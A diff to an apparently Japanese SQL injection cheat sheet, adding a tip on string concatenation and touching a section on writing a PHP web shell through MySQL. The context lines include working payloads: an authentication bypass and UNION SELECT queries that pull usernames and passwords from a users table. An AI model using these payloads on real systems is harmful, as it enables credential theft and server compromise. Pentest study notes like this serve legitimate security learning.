@@ -170,7 +170,8 @@ admin') or (1=1 -- #
 ' UNION SELECT username, password FROM users -- //
 ```
 
-
+> [!TIP]
+> 1つのカラムのみ利用可能な場合[SQLi cheet sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)の「String concatenation」を参照し、文字列を連結する
 
 ```sql
 ' UNION SELECT CONCAT(username, '~', password) FROM users -- //
@@ -178,7 +179,7 @@ admin') or (1=1 -- #
 
 #### ★Webシェルの書き込み（MySQL）
 
-- 必要な条件：ファイルの保存先がMySQLを実行しているユーザによって書き込み可能
+-必要な条件：ファイルの保存先がMySQLを実行しているユーザによって書き込み可能
 
 1. 書き込み可能なディレクトリに PHP web shellの文字列をファイルとして保存する
 ```mysql
